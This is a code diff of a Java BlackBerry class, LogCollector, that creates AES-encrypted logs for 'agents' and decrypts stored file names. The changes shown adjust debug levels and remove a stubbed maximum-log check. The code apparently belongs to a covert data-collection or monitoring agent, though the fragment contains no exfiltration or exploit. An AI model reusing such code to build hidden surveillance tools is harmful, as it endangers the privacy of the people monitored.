@@ -41,7 +41,7 @@ import blackberry.utils.StringSortVector;
  */
 public final class LogCollector implements Singleton {
     //#ifdef DEBUG
-    private static Debug debug = new Debug("LogCollector", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("LogCollector", DebugLevel.INFORMATION);
     //#endif
 
     static LogCollector instance = null;
@@ -108,11 +108,6 @@ public final class LogCollector implements Singleton {
         return instance;
     }
 
-    private static int getLogNum() {
-        // TODO Auto-generated method stub
-        return 0;
-    }
-
     // public boolean storeToMMC;
     Vector logVector;
 
@@ -173,12 +168,6 @@ public final class LogCollector implements Singleton {
      * @return the log
      */
     public synchronized Log factory(final Agent agent, final boolean onSD) {
-        if (getLogNum() > MAX_LOG_NUM) {
-            //#ifdef DEBUG
-            debug.error("Max log reached");
-            //#endif
-            return null;
-        }
 
         final Log log = new Log(agent.agentId, agent.onSD(), keys.getAesKey());
 
@@ -443,8 +432,8 @@ public final class LogCollector implements Singleton {
                     debug.trace("enc name: " + file);
                     //#endif
                     final String plainName = decryptName(file);
-                    //#ifdef DEBUG_TRACE
-                    debug.trace("plain name: " + plainName);
+                    //#ifdef DEBUG_INFO
+                    debug.info("plain name: " + plainName);
                     //#endif
 
                     vector.addElement(plainName, file);
